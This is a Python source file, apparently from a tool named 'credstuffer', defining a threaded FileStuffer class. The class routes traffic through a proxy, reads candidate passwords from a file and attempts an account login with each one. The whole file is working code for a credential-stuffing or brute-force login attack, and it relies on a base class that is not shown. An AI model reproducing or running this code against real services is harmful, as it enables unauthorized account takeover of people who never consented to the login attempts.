import logging
import threading
from credstuffer.stuffer import Stuffer


class FileStuffer(Stuffer, threading.Thread):
    """ class FileStuffer to execute the stuffing algorithm with files

    USAGE:
            filestuffer = Filestuffer(account=account, filepath=/tmp/)
            filestuffer.start()
    """
    def __init__(self, account, filepath):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class FileStuffer')

        # init base class
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)

        self.filepath = filepath

    def run(self) -> None:
        """ executes the run thread for account logins """

        # set proxy to account
        self.set_account_proxy()

        # get passwords from file
        with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip('\n')
                # execute login
                self.account_login(password=password)

